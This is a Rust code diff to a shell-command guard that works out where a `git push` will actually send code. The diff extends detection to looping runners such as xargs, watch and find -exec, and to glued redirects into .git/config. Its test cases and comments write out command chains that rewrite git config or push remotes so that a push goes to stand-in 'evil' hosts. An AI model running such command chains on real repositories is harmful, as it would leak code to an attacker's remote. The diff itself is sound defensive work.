@@ -221,7 +221,9 @@ pub fn push_locations(command: &str, cwd: &str) -> Vec<PushInvocation> {
 /// The walk hands a push only the writes that precede it, which is the order
 /// a straight-line command runs in — so `git push -u origin main && git
 /// remote add upstream <other-owner-url>` stays allowed. A loop body, a
-/// function defined before its call, and a `trap` action break that order:
+/// function defined before its call, a `trap` action, and a runner that can
+/// run its script more than once (`xargs`, `watch`, `parallel`, `find -exec`)
+/// break that order:
 /// `for i in 1 2; do git push origin main; git remote set-url origin <evil>;
 /// done` pushes to `<evil>` the second time round. The trigger is a plain
 /// text match, so a mention in a message only makes the judgment stricter
@@ -232,7 +234,7 @@ fn apply_config_writes_everywhere(
     out: &mut [PushInvocation],
 ) {
     static REORDERS: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
-        regex::Regex::new(r"\b(?:for|while|until|select|function|trap)\b|\(\s*\)")
+        regex::Regex::new(r"\b(?:for|while|until|select|function|trap|xargs|watch|parallel)\b|-(?:exec|execdir|ok|okdir)\b|\(\s*\)")
             .expect("pattern should compile")
     });
     if writes.is_empty() || !REORDERS.is_match(command) {
@@ -1750,24 +1752,20 @@ fn config_writes_of(
     known_ok: bool,
 ) -> Vec<ConfigRedirect> {
     let mut writes = Vec::new();
-    let mut idx = 0;
-    while let Some(word) = tokens.get(idx) {
-        let quoted = unquoted_prefix_lens.get(idx).copied().unwrap_or(0);
-        if let Some((len, whole)) = crate::shell::redirect_operator_span(word)
-            && quoted >= len
-        {
-            let target = if whole {
-                tokens.get(idx + 1).map(String::as_str)
-            } else {
-                Some(&word[len..])
-            };
-            if word[..len].contains('>') && target.is_some_and(|t| names_git_config_file(t, dir)) {
-                writes.push(ConfigRedirect::Unreadable);
-            }
-            idx += if whole { 2 } else { 1 };
-            continue;
-        }
-        idx += 1;
+    // Every output redirection, glued (`x>>.git/config`) or not. One whose
+    // operator follows a quote is kept too: the marks cannot tell `a"b">f`
+    // from `a">"f`, and ambiguity keeps blocking.
+    if crate::shell::token_redirects(tokens, unquoted_prefix_lens)
+        .iter()
+        .any(|redirect| {
+            redirect.operator.contains('>')
+                && redirect
+                    .target
+                    .as_deref()
+                    .is_some_and(|target| names_git_config_file(target, dir))
+        })
+    {
+        writes.push(ConfigRedirect::Unreadable);
     }
 
     let operands = strip_unquoted_redirections(argv, argv_quoted);
@@ -4138,6 +4136,35 @@ mod tests {
             ),
             ("cp evil.cfg .git/config && git push", vec![], vec![], true),
             ("printf x >~/.gitconfig && git push", vec![], vec![], true),
+            // A redirect glued to the word before it (coordinator review).
+            (
+                "echo x>>.git/config && git push origin main",
+                vec![],
+                vec![],
+                true,
+            ),
+            ("echo x>.git/config; git push", vec![], vec![], true),
+            ("printf x>>~/.gitconfig && git push", vec![], vec![], true),
+            ("echo x&>.git/config; git push", vec![], vec![], true),
+            // A runner that can run its script again after the write.
+            (
+                "seq 2 | xargs -I{} sh -c 'git push origin main; git config remote.pushDefault evilr'",
+                vec![],
+                vec!["evilr"],
+                false,
+            ),
+            (
+                "find . -exec true \\; ; git push; git config remote.pushDefault evilr",
+                vec![],
+                vec!["evilr"],
+                false,
+            ),
+            (
+                "watch 'git push origin main; git config remote.pushDefault evilr'",
+                vec![],
+                vec!["evilr"],
+                false,
+            ),
             (
                 "echo x > \"$GIT_DIR/config\" && git push",
                 vec![],
@@ -4184,6 +4211,14 @@ mod tests {
             ),
             (
                 "git push; git remote add upstream https://github.com/evil/y",
+                vec![],
+                vec![],
+                false,
+            ),
+            ("echo \"a>b\" && git push", vec![], vec![], false),
+            ("git push 2>&1 | tee log", vec![], vec![], false),
+            (
+                "git push origin main 2>err.log; git config remote.pushDefault evilr",
                 vec![],
                 vec![],
                 false,
